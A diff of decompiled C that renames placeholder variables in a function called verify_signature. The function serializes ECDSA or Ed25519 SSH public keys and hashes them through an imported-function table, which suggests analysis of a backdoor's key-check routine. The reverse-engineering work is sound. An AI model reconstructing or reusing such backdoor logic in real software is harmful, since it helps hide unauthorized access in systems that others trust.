@@ -33,8 +33,8 @@ BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u6
   long i;
   size_t serialized_len;
   u32 *scratch_cursor;
-  undefined8 local_c1;
-  undefined8 uStack_b9;
+  u8 serialized_key[0x89];
+  u64 serialized_key_pad;
   u8 digest_scratch[128];
   
   if (sshkey == (sshkey *)0x0) {
@@ -63,8 +63,8 @@ BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u6
   status = sshkey->type;
   if (status == 2) {
     ecdsa_key = sshkey->ecdsa;
-    local_c1 = 0;
-    uStack_b9 = 0;
+    *(u64 *)serialized_key = 0;
+    serialized_key_pad = 0;
     scratch_cursor = digest_scratch;
     for (i = 0x79; i != 0; i = i + -1) {
       *(BOOL *)scratch_cursor = signed_data_size < tbs_len;
@@ -89,11 +89,11 @@ BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u6
       return FALSE;
     }
     ec_point_len = (uint)serialized_len;
-    local_c1 = CONCAT44(*(uint *)((u8 *)&local_c1 + 4),
+    *(uint *)serialized_key =
                         ec_point_len >> 0x18 | (ec_point_len & 0xff0000) >> 8 | (ec_point_len & 0xff00) << 8 |
-                        ec_point_len << 0x18);
+                        ec_point_len << 0x18;
     written_len = (*imports->EC_POINT_point2oct)
-                      (ecdsa_group,ecdsa_pubkey,4,(uchar *)((long)&local_c1 + 4),serialized_len,(BN_CTX *)0x0);
+                      (ecdsa_group,ecdsa_pubkey,4,(uchar *)((long)serialized_key + 4),serialized_len,(BN_CTX *)0x0);
     if (serialized_len != written_len) {
       return FALSE;
     }
@@ -118,7 +118,7 @@ BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u6
       return FALSE;
     }
     ed25519_pub = sshkey->ed25519_pk;
-    uStack_b9 = 0;
+    serialized_key_pad = 0;
     scratch_cursor = digest_scratch;
     for (i = 5; i != 0; i = i + -1) {
       *scratch_cursor = 0;
@@ -127,15 +127,15 @@ BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u6
     if (ed25519_pub == (u8 *)0x0) {
       return FALSE;
     }
-    local_c1 = 0x20000000;
+    *(u32 *)serialized_key = 0x20000000;
     i = 0;
     do {
-      *(u8 *)((long)&local_c1 + i + 4) = ed25519_pub[i];
+      *(u8 *)((long)serialized_key + i + 4) = ed25519_pub[i];
       i = i + 1;
     } while (i != 0x20);
     serialized_len = 0x24;
   }
-  success = sha256(&local_c1,serialized_len,signed_data + sshkey_digest_offset,
+  success = sha256(serialized_key,serialized_len,signed_data + sshkey_digest_offset,
                  signed_data_size - sshkey_digest_offset,imports);
 LAB_001076f8:
   if ((((success != FALSE) && (imports = global_ctx->imported_funcs, imports != (imported_funcs_t *)0x0)
